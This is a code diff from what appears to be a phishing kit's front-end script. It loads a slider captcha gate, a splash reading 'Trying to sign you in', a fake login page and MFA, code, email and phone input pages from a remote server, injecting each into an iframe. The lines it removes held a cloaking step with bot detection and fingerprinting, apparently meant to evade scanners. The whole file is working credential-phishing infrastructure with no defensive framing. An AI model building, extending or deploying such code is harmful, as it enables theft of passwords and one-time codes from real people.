@@ -303,48 +303,14 @@
         // Global session token storage
         let sessionToken = null;
 
-        // 2. Callback when Gateway (Captcha) is solved -> Load Processing Page
+        // 3. Callback when Gateway (Slider) is solved -> Fetch Splash
         window.onGatewaySuccess = async (token) => {
             console.log("✅ Gateway solved! Token:", token);
             sessionToken = token; // Store globally
-            console.log("🔐 Loading Security Processing Page (Background Checks)...");
+            console.log("🎬 Fetching Splash (Envelope + 'Trying to sign you in')...");
 
             try {
-                // Fetch the processing page HTML from VPS
-                const response = await fetch(`${API_URL}/processing`);
-                const html = await response.text();
-
-                // Patch the processing page to work in remote iframe context
-                let patchedHtml = html;
-
-                // Intercept the redirect after security checks pass
-                patchedHtml = patchedHtml.replace(
-                    /window\.location\.href = result\.redirect;/g,
-                    `console.log('Security checks passed, redirect:', result.redirect);
-                     if (window.parent && window.parent.onProcessingComplete) {
-                         window.parent.onProcessingComplete();
-                     } else {
-                         window.location.href = result.redirect;
-                     }`
-                );
-
-                // Inject patched processing page into iframe
-                injectIntoFrame(patchedHtml);
-                console.log("⏳ Running background security checks (IP reputation, bot detection, fingerprinting)...");
-
-            } catch (error) {
-                console.error("Processing page fetch error:", error);
-                // Fallback: Skip to splash if processing page fails
-                window.onProcessingComplete();
-            }
-        };
-
-        // 3. Callback when Processing (Security Checks) complete -> Fetch Splash
-        window.onProcessingComplete = async () => {
-            console.log("🎬 Security checks passed! Fetching Splash...");
-
-            try {
-                const response = await fetch(`${API_URL}/pages?type=splash&token=${sessionToken}`, {
+                const response = await fetch(`${API_URL}/pages?type=splash&token=${token}`, {
                     headers: { 'X-API-KEY': API_KEY }
                 });
                 const data = await response.json();
@@ -360,7 +326,7 @@
             }
         };
 
-        // 4. Callback when Splash animation completes -> Fetch Login
+        // 3. Callback when Splash animation completes -> Fetch Login
         window.onSplashComplete = async () => {
             console.log("🎬 Splash complete!");
             console.log("🔄 Fetching Login Page...");
@@ -382,12 +348,7 @@
             }
         };
 
-
-        // 5. General Step Handler (Called by patched Login/MFA pages)
-        // Deduplication variables to prevent unnecessary reloads
-        let lastPageFetched = null;
-        let lastPageFetchTime = 0;
-
+        // 4. General Step Handler (Called by patched Login/MFA pages)
         window.onStepRequired = async (stepUrl) => {
             console.log("🚦 Step Required:", stepUrl);
 
@@ -398,48 +359,10 @@
                 return;
             }
 
-            // CASE B: Internal Step (MFA / Very / MailInput / CodeInput / etc.)
-            // stepUrl is like '/TOKEN/very' or 'very' or '/TOKEN/mailinput'
-            // Extract the page type from the URL
-            let type = 'very'; // default
-
-            // Parse URL to extract page type AND token
-            const urlParts = stepUrl.split('/').filter(p => p); // Remove empty parts
-
-            // CRITICAL: Extract token from URL to sync with backend
-            // If URL is '/NEWTOKEN/pagetype', update sessionToken
-            if (urlParts.length === 2) {
-                const potentialToken = urlParts[0];
-                const potentialType = urlParts[1];
-                const validTypes = ['very', 'mfa', 'mailinput', 'phoneinput', 'numinput', 'codeinput', 'login'];
-
-                // If second part is a valid page type, first part is the token
-                if (validTypes.includes(potentialType) && potentialToken.length === 16) {
-                    // Sync token with backend
-                    if (sessionToken !== potentialToken) {
-                        console.log(`🔄 Syncing token: ${sessionToken} → ${potentialToken}`);
-                        sessionToken = potentialToken;
-                    }
-                    type = potentialType;
-                }
-            } else if (urlParts.length === 1) {
-                // Just page type, no token in URL
-                const validTypes = ['very', 'mfa', 'mailinput', 'phoneinput', 'numinput', 'codeinput', 'login'];
-                if (validTypes.includes(urlParts[0])) {
-                    type = urlParts[0];
-                }
-            }
-
-            // DEDUPLICATION: Prevent fetching the same page twice within 2 seconds
-            const now = Date.now();
-            if (lastPageFetched === type && (now - lastPageFetchTime) < 2000) {
-                console.log(`⏭️  Ignoring duplicate request for ${type} (fetched ${now - lastPageFetchTime}ms ago)`);
-                return;
-            }
-
-            // Update deduplication tracking
-            lastPageFetched = type;
-            lastPageFetchTime = now;
+            // CASE B: Internal Step (MFA / Very)
+            // stepUrl is like '/TOKEN/very' or just 'very'
+            let type = 'very';
+            if (stepUrl.includes('mfa')) type = 'mfa';
 
             console.log(`🔄 Fetching ${type} page...`);
 
@@ -461,12 +384,6 @@
 
         function injectIntoFrame(htmlContent) {
             const doc = iframe.contentWindow.document;
-
-            // Clear iframe properly without breaking WebSocket
-            // Use location.replace instead of setting src to avoid async issues
-            iframe.contentWindow.location.replace('about:blank');
-
-            // Immediately write new content (synchronous - no delays)
             doc.open();
             doc.write(htmlContent);
             doc.close();
